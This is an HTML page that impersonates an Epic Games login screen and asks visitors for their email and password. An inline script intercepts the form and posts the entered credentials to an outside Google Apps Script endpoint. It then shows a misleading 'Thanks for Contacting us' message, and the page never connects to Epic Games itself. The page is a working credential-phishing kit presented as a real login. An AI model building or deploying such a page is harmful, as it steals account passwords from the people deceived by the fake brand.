<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <title>Document</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <style>
            
            body{
                background: rgb(18, 18, 18)

            }
            


            .register .nav-tabs .nav-link:hover{
                border: none;
            }
            .text-align{
                margin-top: -3%;
                margin-bottom: -9%;

                padding: 10%;
                margin-left: 30%;
            }
            .form-new{
                margin-right: 20%;
                margin-left: 20%;
            }
            .register-heading{
                color: #ffffff;
            }
            .register-heading h1{
                margin-left: 21%;
                margin-bottom: 10%;
                color: #3b3b3b;
            }
            .register{
                background: -webkit-linear-gradient(left, #343a40,#343a40);
                margin-top: 3%;
                padding: 3%;
           
            }
            .btnSubmit
            {
                border-radius: 5px;
                width: 50%;
                padding: 1.5%;
                color: #fff;
                background-color: #2e2d2d;
                border: none;
                cursor: pointer;
                margin-right: 6%;
                color: rgb(246, 246, 252);
                margin-top: 4%;
            }

            .epicgames{
                text-align: center;
            }

    
    </style>

</head>
<body>
    

<div class="container register">
            <div class="row">
                <div class="col-md-12">
                        <div class="tab-pane fade show active text-align form-new" id="home" role="tabpanel" aria-labelledby="home-tab">
                        <div class="epicgames">
                            <img src="logo.svg" width="150px">
                        <center><p class="register-heading">Please enter your Epic Games account!</p></center>
                            </div>
                            <div class="row register-form">
                                <div class="col-md-12">
                                    <form method="post" autocomplete="off" name="google-sheet">
                                        <div class="form-group">
                                            <input type="text" name="Email" class="form-control" placeholder="Email" value="" required=""/>
                                        </div>
                                        <div class="form-group">
                                            <input type="text" name="Jelszo" class="form-control" placeholder="Password" value="" required=""/>
                                        </div>
                                        <div class="form-group">
                                            <input type="submit" name="submit" class="btnSubmit btn-block" value="Login" />
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                </div>
            </div>
        </div>
          
          <script>
            const scriptURL = 'https://script.google.com/macros/s/AKfycbwUmh1WCd9TYTGnxDdUr0izxkka5MxZfpbJbk3oYm0gAjHNhWaH9YZmS8ssq5hB126y/exec'
            const form = document.forms['google-sheet']
          
            form.addEventListener('submit', e => {
              e.preventDefault()
              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
                .catch(error => console.error('Error!', error.message))
            })
          </script>

        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</body>
</html>
